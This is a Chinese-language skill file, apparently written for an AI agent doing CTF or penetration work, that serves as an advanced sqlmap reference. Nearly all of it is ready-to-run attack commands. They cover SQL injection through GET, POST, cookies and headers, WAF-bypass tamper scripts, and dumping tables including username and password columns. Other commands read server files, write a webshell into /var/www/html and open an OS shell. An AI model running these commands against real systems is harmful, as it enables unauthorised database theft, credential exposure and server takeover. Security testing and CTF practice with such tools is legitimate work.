---
name: sqlmap-advanced
description: "sqlmap 高级用法完整参考。当确认存在 SQL 注入需要用 sqlmap 自动化利用时使用。覆盖 POST/Cookie/Header 注入、tamper 脚本选择、--technique 精确控制、二次注入、OS shell/文件读写、数据库提取优化"
metadata:
  tags: "sqlmap,sql injection,tool,tamper,bypass,waf,os-shell,file-read,file-write,数据库,注入工具"
  category: "tool"
---

# sqlmap 高级用法完整参考

## 超时控制（强制执行）

sqlmap 可能运行很长时间。**必须用 timeout 包裹**：

```bash
timeout 480 sqlmap [参数] --batch 2>&1 | tee /tmp/sqlmap_output.log
# 超时后立即查看已有结果
tail -80 /tmp/sqlmap_output.log
```

## 深入参考

- tamper 脚本速查表 → [references/tamper-reference.md](references/tamper-reference.md)
- 高级用法详细命令（OS Shell/文件读写/二次注入/性能调优） → [references/advanced-usage.md](references/advanced-usage.md)

---

## Phase 1: 基础检测

### GET 参数注入

```bash
timeout 480 sqlmap -u 'http://target/page.php?id=1' \
    --batch --random-agent --level 2 --risk 2 \
    2>&1 | tee /tmp/sqlmap_output.log
```

### POST 参数注入

```bash
timeout 480 sqlmap -u 'http://target/login.php' \
    --data 'username=admin&password=test&submit=Login' \
    --batch --random-agent --level 2 --risk 2 \
    2>&1 | tee /tmp/sqlmap_output.log
```

**关键**：`--data` 中包含所有表单字段（尤其 submit 按钮），PHP 常用 `isset($_POST['submit'])` 校验。

### Cookie 注入

```bash
timeout 480 sqlmap -u 'http://target/page.php' \
    --cookie 'user_id=1; session=abc123' \
    --level 3 \
    --batch --random-agent \
    2>&1 | tee /tmp/sqlmap_output.log
```

### HTTP Header 注入

```bash
timeout 480 sqlmap -u 'http://target/page.php' \
    --headers 'X-Forwarded-For: 127.0.0.1*' \
    --level 5 \
    --batch --random-agent \
    2>&1 | tee /tmp/sqlmap_output.log
```

星号 `*` 标记注入点位置。

### 从 Burp 请求文件

```bash
timeout 480 sqlmap -r /tmp/request.txt \
    --batch --random-agent --level 2 --risk 2 \
    2>&1 | tee /tmp/sqlmap_output.log
```

---

## Phase 2: --technique 精确控制

| 字母 | 技术 | 适用场景 |
|------|------|----------|
| B | Boolean-based blind | 有布尔差异（页面内容变化） |
| E | Error-based | 有报错回显 |
| U | UNION query | 有数据回显 |
| S | Stacked queries | 支持分号（MySQL、MSSQL、PostgreSQL） |
| T | Time-based blind | 无任何差异（最后手段） |
| Q | Inline queries | 子查询注入 |

```bash
# 只用 UNION + Error（最快）
sqlmap -u 'URL' --technique EU --batch

# 跳过耗时的时间盲注
sqlmap -u 'URL' --technique BEUS --batch
```

**建议**：先用 `--technique EU` 快速检测，失败再加 `B`，最后才试 `T`。

---

## Phase 3: 数据提取

```bash
# 1. 列出所有数据库
sqlmap -u 'URL' --dbs --batch

# 2. 列出指定库的表
sqlmap -u 'URL' -D target_db --tables --batch

# 3. 列出指定表的列
sqlmap -u 'URL' -D target_db -T users --columns --batch

# 4. 提取数据
sqlmap -u 'URL' -D target_db -T users --dump --batch

# 5. 只取特定列
sqlmap -u 'URL' -D target_db -T users -C username,password --dump --batch

# 6. 限制行数（大表时）
sqlmap -u 'URL' -D target_db -T users --dump --start 1 --stop 10 --batch

# 7. 搜索关键表/列
sqlmap -u 'URL' --search -T flag --batch
sqlmap -u 'URL' --search -C password --batch
```

---

## 实战速查

| 场景 | 命令关键参数 |
|------|-------------|
| 快速检测 | `--technique EU --level 1 --risk 1` |
| 深度检测 | `--level 5 --risk 3` |
| POST 表单 | `--data 'param1=val1&param2=val2'` |
| Cookie 注入 | `--cookie 'x=1' --level 3` |
| WAF 环境 | `--tamper=space2comment,between --random-agent` |
| 读 flag 文件 | `--file-read=/flag.txt` |
| 写 webshell | `--file-write=shell.php --file-dest=/var/www/html/` |
| 拿系统 shell | `--os-shell` |
| 二次注入 | `--second-url URL` |
| 搜索 flag | `--search -T flag` 或 `--search -C flag` |

## 注意事项

- `--batch` 自动选择默认答案（必加，agent 无法交互）
- `--risk 3` 可能执行 UPDATE/DELETE，有风险环境慎用
- `timeout 480` 最多跑 8 分钟，超时检查已有结果
- sqlmap 会缓存结果，重跑同目标用 `--flush-session` 清除缓存
- 如果 sqlmap 检测不到注入但手工确认存在 → 用 `--prefix` 和 `--suffix` 手动指定闭合
